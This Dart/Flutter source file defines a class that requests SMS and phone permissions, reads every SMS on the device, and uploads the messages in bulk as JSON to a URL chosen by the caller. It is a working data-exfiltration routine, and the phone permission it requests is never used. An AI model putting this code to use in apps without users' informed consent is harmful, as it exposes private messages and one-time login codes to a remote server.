import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;

import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:permission_handler/permission_handler.dart';

class ReadInbox {
  SmsQuery query = SmsQuery();

  Future<List<Map<String, dynamic>>> readInboxData(
      {required String url, String? token}) async {
    try {
      var smsPermission = await Permission.sms.request();
      var callLogPermission = await Permission.phone.request();
      if (smsPermission.isGranted && callLogPermission.isGranted) {
        final messages = await SmsQuery.instance!.getAllSms;
        List<Map<String, dynamic>> messageList = messages.map((message) {
          return {
            'id': message.id.toString(),
            'threadId': message.threadId.toString(),
            'address': message.address ?? "Unknown",
            'body': message.body ?? "No message",
            'date': message.date.toString(),
            'dateSent': message.dateSent.toString(),
            'read': message.read.toString(),
          };
        }).toList();

        bool isValid = await isUrlValid(url, token: token);

        if (!isValid) {
          print("Skipping API call: URL is invalid or unreachable");
        } else {
          Map<String, String> headers = {
            'Content-Type': 'application/json',
          };

          if (token != null) {
            headers['Authorization'] = 'Bearer $token';
          }

          var response = await http.post(Uri.parse(url),
              headers: headers, body: json.encode(messageList));

          print("Status Code: ${response.statusCode}");
          print("Headers: ${response.headers}");
          print("Response Body: ${response.body}");
        }

        return messageList;
      }
    } on SocketException {
      print("Error occured!!");
    }

    return [];
  }

  Future<bool> isUrlValid(String url, {String? token}) async {
    try {
      Map<String, String> headers = {
        'Content-Type': 'application/json',
      };

      if (token != null) {
        headers['Authorization'] = 'Bearer $token';
      }

      final response = await http
          .head(
            Uri.parse(url),
            headers: headers,
          )
          .timeout(const Duration(seconds: 3));

      return response.statusCode >= 200 && response.statusCode < 400;
    } catch (e) {
      print("URL check failed: $e");
      return false;
    }
  }
}
